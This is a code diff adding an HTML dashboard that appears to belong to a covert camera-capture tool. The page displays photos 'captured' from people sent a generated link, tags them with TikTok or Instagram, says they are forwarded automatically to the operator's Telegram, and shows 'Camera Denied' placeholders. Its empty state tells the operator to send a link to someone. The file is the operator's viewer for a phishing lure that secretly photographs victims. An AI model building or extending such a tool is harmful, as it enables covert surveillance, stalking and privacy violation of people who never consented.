@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Dashboard — Captured Photos</title>
+    <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+    <div class="container">
+        <div class="card dashboard-card">
+            <h1>📸 Captured Photos</h1>
+            <p class="subtitle">All photos sent automatically to your Telegram</p>
+
+            <div class="dashboard-controls">
+                <button id="refreshBtn" class="btn-small">🔄 Refresh</button>
+                <button id="clearAllBtn" class="btn-small btn-danger">🗑 Clear All</button>
+                <a href="/index.html" class="btn-small" style="border-color:rgba(79,172,254,0.4);color:#4facfe;text-decoration:none;">🔗 Generate Link</a>
+            </div>
+
+            <div id="photoGrid" class="photo-grid">
+                <div class="empty-state">
+                    <p>Loading photos...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        async function loadPhotos() {
+            const grid = document.getElementById('photoGrid');
+            
+            try {
+                const res = await fetch('/api/photos');
+                const photos = await res.json();
+
+                if (photos.length === 0) {
+                    grid.innerHTML = `
+                        <div class="empty-state">
+                            <p>No photos captured yet. Generate a link and send it to someone!</p>
+                        </div>
+                    `;
+                    return;
+                }
+
+                grid.innerHTML = photos.map(photo => {
+                    const platformClass = photo.platform === 'tiktok' ? 'tiktok-tag' : 'instagram-tag';
+                    const platformName = photo.platform === 'tiktok' ? 'TikTok' : 'Instagram';
+                    const platformEmoji = photo.platform === 'tiktok' ? '♫' : '📷';
+                    
+                    return `
+                        <div class="photo-card">
+                            <img src="${photo.imageUrl || 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 200 200"%3E%3Crect fill="%23333" width="200" height="200"/%3E%3Ctext x="50%25" y="50%25" fill="%23666" font-size="14" text-anchor="middle" dy=".3em"%3ECamera Denied%3C/text%3E%3C/svg%3E'}" 
+                                 alt="Captured" onerror="this.src='data:image/svg+xml,%253Csvg xmlns=%2522http://www.w3.org/2000/svg%2522 width=%2522200%2522 height=%2522200%2522 viewBox=%25220 0 200 200%2522%253E%253Crect fill=%2522%2523333%2522 width=%2522200%2522 height=%2522200%2522/%253E%253Ctext x=%252250%2525%2522 y=%252250%2525%2522 fill=%2522%2523666%2522 font-size=%252214%2522 text-anchor=%2522middle%2522 dy=%2522.3em%2522%253EImage Error%253C/text%253E%253C/svg%253E'" />
+                            <div class="photo-meta">
+                                <span class="platform-tag ${platformClass}">${platformEmoji} ${platformName}</span>
+                                <span class="name">${photo.name}</span>
+                                <span class="timestamp">${new Date(photo.capturedAt).toLocaleString()}</span>
+                                ${photo.error ? `<span class="timestamp" style="color:#f5576c;">⚠️ ${photo.error}</span>` : ''}
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            } catch (err) {
+                grid.innerHTML = `
+                    <div class="empty-state">
+                        <p>❌ Error loading photos: ${err.message}</p>
+                    </div>
+                `;
+            }
+        }
+
+        loadPhotos();
+
+        document.getElementById('refreshBtn').addEventListener('click', loadPhotos);
+
+        document.getElementById('clearAllBtn').addEventListener('click', async () => {
+            if (confirm('Delete ALL captured photos?')) {
+                await fetch('/api/photos', { method: 'DELETE' });
+                loadPhotos();
+            }
+        });
+    </script>
+</body>
+</html>
